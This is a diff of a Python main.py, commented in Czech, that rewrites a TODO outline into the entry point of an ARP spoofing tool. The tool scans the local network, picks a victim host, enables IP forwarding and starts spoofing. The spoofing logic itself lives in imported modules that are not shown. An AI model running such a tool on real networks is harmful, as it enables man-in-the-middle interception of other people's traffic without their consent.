@@ -1,28 +1,25 @@
-# main.py - TODO LIST
-
-# 1. TODO: Importovat funkce z network_utils a spoofer_logic
-
-# 2. TODO: Získat od uživatele vstupní data (IP oběti a IP routeru)
-# 3. TODO: Zavolat skener a zjistit MAC adresy oběti i routeru
-
-# 4. TODO: Hlavní smyčka útoku (try - except)
-#    - V 'try' bloku: volat spoof() v nekonečném cyklu (while True)
-#    - Přidat malou pauzu (time.sleep(2)), ať nezahltíte síť
-#    - V 'except KeyboardInterrupt' (po zmáčknutí Ctrl+C):
-#        - Zavolat restore() pro opravu sítě
-#        - Vypnout IP forwarding
-#        - Uložit .pcap soubor
-
-from network_utils import scan_network, toggle_forwarding
+# main.py
+from network_utils import scan_network, select_target, toggle_forwarding
 from spoofer_logic import spoof
-if __name__ == "__main__":
+
+def main():
+    # 1. Sken sítě
+    print("[*] Skenuji síť...\n")
     scan_network()
+
+    # 2. Výběr oběti
+    target_ip, target_mac = select_target()
+    if not target_ip:
+        print("[-] Nepodařilo se vybrat cíl. Ukončuji.")
+        return
+
+    # 3. Zapnutí IP forwardingu
     print("\n[+] Zapínám IP forwarding...")
     toggle_forwarding(True)
 
-    try:
-        while True:
-            spoof()
-    except KeyboardInterrupt:
-        print("\n[+] Ukončuji útok...")
-        toggle_forwarding(False)
+    # 4. Spuštění ARP spoofingu
+    print("\n[*] Spouštím ARP spoof...\n")
+    spoof(target_ip, target_mac)
+
+if __name__ == "__main__":
+    main()
